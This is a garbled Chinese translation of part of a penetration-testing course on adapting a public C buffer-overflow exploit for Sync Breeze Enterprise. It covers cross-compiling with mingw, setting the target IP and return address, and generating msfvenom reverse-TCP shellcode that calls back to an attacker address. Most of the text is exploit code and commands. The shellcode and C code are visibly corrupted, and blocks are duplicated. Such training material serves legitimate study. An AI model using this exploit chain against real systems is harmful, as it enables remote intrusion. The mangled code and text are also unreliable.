+通过产品和版本搜索，我们注意到针对这一特定漏洞有两个可用的利用程序，其中是用 C 语言编写的：
+
+`kali: searchploit "Sync Breeze Enterprise 10.0.28"`
+
+| 漏洞程序标题 | 路径 (/usr/share/exploitdb/) |
+| --- | --- |
+| Sync Breeze Enterprise 10.0.0.28 - Remote Buffer Over | exploits/windows/remote/42928.py |
+| Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/dos/42341.c |
+
+列表 426 - 使用 searchploit 为你的漏洞软件搜索可用的利用程序
+
+由于我们已经熟悉漏洞的工作原理以及如何被利用，我们获得了一个很好的机会来观察 Python 等脚本语言与像 C 这样的编译语言之间的区别，而无需处理解析新漏洞的复杂性。
+
+虽然这两种语言之间有很多差异，但我们关注将影响我们的两个主要差异，包括内存管理和字符串操作。
+
+第一个关键区别是，脚本语言是通过解释器执行的，而不是编译成可执行文件。由于脚本语言需要解释器，这意味着我们无法在没有安装 Python 的环境中运行。
+
+作为替代方案，我们可以考虑 PyInstaller，它将 Python 打包成独立的可执行文件。
+
+两种语言之间的另一个区别是，在 Python 中，字符串字符串非常简单：
+
+```python
+>>> string1 = "This is"
+>>> string2 = " test"
+>>> string3 = string1 + string2
+>>> print(string3)
+```
+列表 427 - Python 中的字符串拼接
+
+虽然我们可以在 Kali 上编译此内容，但我们仍然会对该漏洞程序进行交叉编译。现在漏洞程序已经镜像，我们可以检查它以确定需要哪些修改。
+
+然而，在编译之前，我们注意到头文件指示此代码是为 Windows 设计的：
+
+```c
+#include <stdio.h>
+#include <winsock.h>
+#include <windows.h>
+#include <int>
+```
+列表 429 - 显示这里的 C 头文件
+
+### 15.1.3 交叉编译漏洞代码
+
+为了避免编译问题，强烈建议针对目标操作系统使用原生编译器；但这始终是一个选项。
+
+在某些情况下，我们无法访问特定的环境（如 Kali），但需要利用为不同平台编写的漏洞程序。这就是交叉编译器非常有帮助的地方。
+
+我们在此处使用非常流行的 mingw-64 交叉编译器。如果可用，可以通过 apt 安装。
+
+```bash
+kali: sudo apt install mingw-64
+```
+列表 430 - 在 Kali 中安装 mingw-64
+
+安装完成后，我们可以使用 mingw-64 将代码编译成 Windows PE。第一步是查看无错误的代码：
+
+```bash
+kali: i686-w64-mingw32-gcc -o exploit.exe
+```
+
+
+
+`/sync/breezeexploit.c:(tex+0x3)`: undefined reference to `__WSASStartup`
+
+`/sync/breezeexploit.c:(tex+0x3)`: undefined reference to `__WSAGLastError@`
+
+`/sync/breezeexploit.c:(tex+0x80)`: undefined reference to `__socket@12`
+
+`/sync/breezeexploit.c:(tex+0x93)`: undefined reference to `__WSAGLastError@`
+
+`/sync/breezeexploit.c:(tex+0xd0)`: undefined reference to `__inet_addr@4`
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```c
+/+syncreze_exploit.c:(text+0xdd): undefined reference to _imp_htons@
+/+syncreze_exploit.c:(text+0x106): undefined reference to _imp_connect@2
+/+syncreze_exploit.c:(text+0x4f): undefined reference to _imp_send@16
+/+syncreze_exploit.c:(text+0x182): undefined reference to _imp_socket@4
+collect2: error: 1d returned 1
+```
+
+列表 431 - 使用 mingw 尝试编译漏洞后显示的错误
+
+编译过程中出现了一些问题，列表 431 中的错误看起来很异异。在 Google 上搜索 "`WSStartup`" 可以发现 `winsock.h` 中有一个该函数。研究表明，这些错误发生在链接器找不到 winsock 库时，在 `i686-w64-mingw32-gcc` 命令中添加 `-lws2_32` 参数即可解决该问题：
+
+```
+kali@kali:~$ i686-w64-mingw32-gcc 4234.1 -o syncreze_exploit.exe -lws2_32
+```
+
+```
+kali@kali:$ ls -la
+
+total 372
+
+drwxr-xr-x 2 root root Feb 24 14:13 .
+
+drwxr-xr-x 17 root root Feb 24 15:42 ..
+
+-rw-r--r-- 1 root root 4.7K Feb 24 15:46 4234.1exe
+
+-rwxr-xr-x 1 root root 355K Feb 24 17:13 syncreze_exploit.exe
+```
+
+列表 432 - 使用 mingw-64 命令链接到 winsock 库后成功编译代码
+
+列表 432 显示 mingw-32 产生了一个可执行文件，没有生成任何编译错误。
+
+## 15.1.3.1 练习题
+
+- 1. 使用 Kali Linux 中的 `searchplo` 工具找到本节讨论的漏洞。
+- 2. 在 Kali Linux 中安装 `mingw-w4` 件并编译漏洞代码。
+
+## 15.1.4 修改 Socket 信息
+
+我们已经知道该漏洞针对的是一个远程访问的漏洞，这意味着我们的代码需要在某个时刻与目标建立连接。检查代码：
+
+```c
+printf("%s\n",
+server.sin_addr.s_addr = inet_addr("10.11.0.22");
+server.sin_family = AF_INET;
+server.sin_port = htons(0);
+```
+
+列表 433 - 识别 IP 地址和端口的代码行
+
+这些是我们在漏洞利用中需要调整的值。
+
+### 15.1.4.1 练习题
+
+- 1. 修改漏洞中的连接信息，以针对你 Windows 客户端上的 SyncBreeze 安装。
+- 2. 重新编译漏洞并使用 Wireshark 确认代码成功启动了到你专用 Windows 客户端的 socket 连接。
+
+## 15.1.5 修改返回地址
+
+进一步检查代码发现使用了位于 `msbvm60.dll` 中的返回地址，该文件并不是漏洞软件的一部分。查看我们 Windows 客户端调试器中加载的模块，我们该 DLL 缺失，这意味着返回地址对于我们的目标是无效的。
+
+鉴于我们已经从之前开发的漏洞获得了一个漏洞，可以用自己的地址替换目标返回地址：
+
+```c
+unsigned char retn[] = "\x83\xdc\x09\x10"; // 0x1090c83
+```
+
+列表 434: 修改返回地址
+
+如果我们没有从之前开发的漏洞中获得返回地址，有几种选择。第一种也是最推荐的选项是在本地重建目标环境，并使用调试器确定此地址。这是我们开发原始漏洞时使用的过程。
+
+如果这不可行，我们可以使用公开漏洞中的信息来获取与我们的目标环境匹配的可靠返回地址。例如，如果我们需要为 Windows Server 2003 SP2 上的 JSP 漏洞获取返回地址，可以在利用该操作系统的不同漏洞的公开漏洞中查找。这种方法是可靠的，并且根据所安装的操作系统的保护措施而异。
+
+另一种方法是我们可以直接从目标机器获取返回地址。如果我们以无权限用户的身份访问目标，并想要运行一个提升权限的漏洞，可以将感兴趣的 DLL 拷贝到攻击机，并使用调试器或 Metasploit Framework 中的 `msfpecfind` 工具来获取可靠的返回地址。
+
+### 15.1.5.1 练习题
+
+- 1. 找到任何返回地址指令并更改原始漏洞中的那个。
+
+## 15.1.6 修改负载
+
+继续分析我们的 C 语言漏洞，我们注意到 `shellcode` 变量似乎持有负载。由于它是以十六进制字节存储的，我们可以很容易判断它的用途。作者提供的唯一提示是指作为 shellcode 部分的 NOP 滑块（NOP slide）：
+
+```c
+unsigned char shellcode[] =
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP slide
+\x90\x90\x83\xdc\x62\x62\x61\x31\xc9\xb6\xe4\x71\x64\xf8\x31\xc9\xb6\x52\x31\x67\x17\x83\x60\x64\x31\xf8\x64\x61\x64\x52\x65\x06\x27\x13
+\xd9\x6f\x68\x78\x71\x64\x65\x60\xb4\x67\x37
+\xe6\x45\x61\xcc\x62\x82\x41\x63\x65\x28\x64\x64\x84\x64\x64
+\xf5\x58\x64\x64\x44\x22\x2c\x81\xe6\xcc\xdd\x84\x70
+\xf0\x68\x60\x67\x78\x71\x72\x64\x65\x60\x64\x64\x7f\x98\x84\x6a\x6a
+\x93\x65\x64\x63\x65\x68\x68\x62\x74\x73\x92\xac\x85\x84\x4a\x92\x68\x62\x65\x64\x58\x59\x64\x6e\x2c\x3a\x39\x38 (Offensive Security, 2019), https://www.offsecurity.com/
+"\x64\x29\x65\x6e\xe9\x18\x28\xe6\xfe\x61\xc9\xd8\x74
+\x2d\x81\x8d\x95\x41\x57\x5c\x88\x77\x31\x23\xb1\xc7\x83\x74
+\x2d\x81\x9d\x51\x55\x41\x45\x27\x81\x8e\x55\x53\xb34\x18
+\x38\x8f\x86\x65\x8e\x88\x29\x64\x91\xf6\x9f\x63\x26\x68\x91
+\x38\x8f\x81\x49\xd5\x77\x5b\x67\xf6\x9f\x69\x35\x68\x91
+\x70\x8a\x75\x31\x85\x31\x82\x24\x62\x81\xd4\x64\xb6\xfa\xe4\x99
+\xf8\x51\x33\x31\x82\x24\xf2\x61\xd2\xb1\x8a\xe6\x32\xb9\x72\x71
+\x9e\x31\x94\x3c\x81\x6e\x81\x6f\x81\x84\x83\x85\x37\x97\x64
+\xf6\xbc\x64\x35\x71\x34\x38\x34\x20\x25\xf31\xf64\x85\x53
+\x58\x81\x6c\x68\x64\x64\x84\x61\x74\x81\x64\x14\x63\x52
+\x58\x81\x86\x9a\x77\x68\x64\x74\x81\x64\x77\x85\x93\xcc5
+```
+
+
+
+\xf8\x81\x65\x71\x80\x8e\x91\x86\x69\x98\x69\x31\x66\x52
+
+\x64\x31\x65\x79\x81\x83\x13\xd7\x62\x9c\x25\x99\x69
+
+\x65\x69\x8c\x83\x6c\x69\x94\x88\x85\x82\x26\x37\x24\x9f
+
+\xc8\x81\x86\x84\x86\x64\x88\x81\x52
+
+列表 435 - `shellcode` 变量包含一个 NOP 滑块
+
+由于我们已经混淆了研究，我们找到了：
+
+```
+kali@root:~ msfvenom -p windows/reverse_tcp HOST=10.1.0.4 PORT=4444 -f x86
+```
+
+尝试用 0 次迭代编码负载：
+
+`x86/ga` 编码成功，大小为 351
+`x86/ga` 编码失败，最终大小 351
+
+负载大小：351 字节
+
+```c
+unsigned char *payload = {
+```
+
+# OFFENSIVE SECURITY
+www.offensive-security.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+在进行了上述所有更改之后，我们的利用代码看起来如下：
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+```c
+char request_one[] = "POST /login HTTP/1.1\r\n"
+"Host: 10.11.0.22\r\n"
+"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/2010101 Firefox/52.0\r\n"
+"Accept: text/html,application/xml,xml;q=0.9\r\n"
+"Accept-Language: en-US,q=0.5\r\n"
+"Referer: http://10.11.0.22/login\r\n"
+"Connection: close\r\n"
+"Content-Type: application/x-www-form-urlencoded\r\n"
+"Content-Length: "\r\n"
+char request_two[] = "username=\r\n"
+int initial_buffer_size = 789;
+char *padding = malloc(buffer_size);
+memset(padding, 0x41, initial_buffer_size);
+memset(padding + initial_buffer_size, 1, 0x00);
+unsigned char retn = "\x31\xe3\x90\x10" // 0x1090c8d3
+// root@msfven -p windows reverse_tcp LHOST=10.11.0.4 PORT=4443
+msfvenom -f -e x86/shikata_ga_nai -b \x00\x90\x25\x26\x3d
+unsigned char shellcode[] = 
+```
+
+
+
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\n\x90\xf1\x27\x24\x31\x61\x91\x97\x74\x54\x54\x51\x91\x91\x53\x51\x31\x31\x31\x71\x71\x71\x71\x81\x61\x61\x61\x61\x61\x61\x61\x61\x51\x61\x61\x61\x61\x51\x61\x51\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x
+
+
+
+# 攻击安全
+www.offensive-security.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+在进行了上述更改之后，我们的利用代码如下：
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+```c
+char request_one[] = "POST /login HTTP/1.1\r\n"
+"Host: 10.11.0.22\r\n"
+"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/2010101 Firefox/52.0\r\n"
+"Accept: text/html,application/xml,xml;q=0.9\r\n"
+"Accept-Language: en-US,q=0.5\r\n"
+"Referer: http://10.11.0.22/login\r\n"
+"Connection: close\r\n"
+"Content-Type: application/x-www-form-urlencoded\r\n"
+"Content-Length: "\r\n"
+char request_two[] = "username=\r\n"
+int initial_buffer_size = 789;
+char *padding = malloc(buffer_size);
+memset(padding, 0x41, initial_buffer_size);
+memset(padding + initial_buffer_size, 1, 0x00);
+unsigned char retn = "\x31\xe3\x90\x10" // 0x1090c8d3
+// root@msfven -p windows reverse_tcp LHOST=10.11.0.4 PORT=4443
+msfvenom -f -e x86/shikata_ga_nai -b \x00\x90\x25\x26\x3d
+unsigned char shellcode[] = 
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\n\x90\xf1\x27\x24\x31\x61\x91\x97\x74\x54\x54\x51\x91\x91\x53\x51\x31\x31\x31\x71\x71\x71\x71\x81\x61\x61\x61\x61\x61\x61\x61\x61\x51\x61\x61\x61\x61\x51\x61\x51\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61",
+char request_three[] = "password=\r\n";
+int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode);
+sprintf(content_length_string, "%s", content_length);
+initial_buffer_size = strlen(request_one) + strlen(request_two) + strlen(shellcode) + strlen(request_three);
+char *buffer = malloc(buffer_length);
+memset(buffer, 0x00, buffer_length);
+strncpy(buffer, request_one);
+strcat(buffer, content_length_string);
+strcat(buffer, request_two);
+strcat(buffer, padding);
+strcat(buffer, retn);
+strcat(buffer, shellcode);
+strcat(buffer, request_three);
+SendRequest(buffer, strlen(buffer));
+int main() {
+  EvilRequest();
+  return 0;
+}
+```
+
+### 遵循 mingw64 后的 return 指令以及 payload
+
+现在我们有一个经过干净编译的利用，可以对其进行测试。我们将调试器附加到沙箱的服务，并在我们的 JSP 指令处设置断点：
+
+```assembly
+004010E4: 8B   DWORD PTR [ESI:ECX]
+004010E7: 8B   BYTE PTR [EDI]
+004010EA: 89   MOV EAX,EAX
+004010EB: 8D   MOV EBP,EBP
+004010EE: 89   BYTE PTR [ESI:(EAX+909090)]]
+004010F2: 90   NOP
+004010F3: 90   NOP
+004010F4: 90   NOP
+004010F5: 90   NOP
+004010F6: 90   NOP
+004010F7: 8B   DWORD PTR [ESI:ESP+41]
+004010FA: 8B   DWORD PTR [ESI:ESP+38]
+```
+
+
+
+```
+004010ED: 89   DWORD PTR [ESI:(ECX+468)]]
+
+00401102: 90   NOP
+
+00401103: 90   NOP
+
+00401104: 90   NOP
+
+00401105: 90   NOP
+
+00401106: 90   NOP
+
+00401107: 90   NOP
+
+00401108: 90   NOP
+
+00401109: 90   NOP
+
+0040110A: 90   NOP
+
+0040110B: 90   NOP
+
+0040110C: 90   NOP
+
+0040110D: 90   NOP
+
+0040110E: 90   NOP
+
+0040110F: 90   NOP
+
+00401110: 90   NOP
+
+00401111: 90   NOP
+
+00401112: 90   NOP
+
+00401113: 90   NOP
+
+00401114: 8B   DWORD PTR [ESI:ESP+24]
+
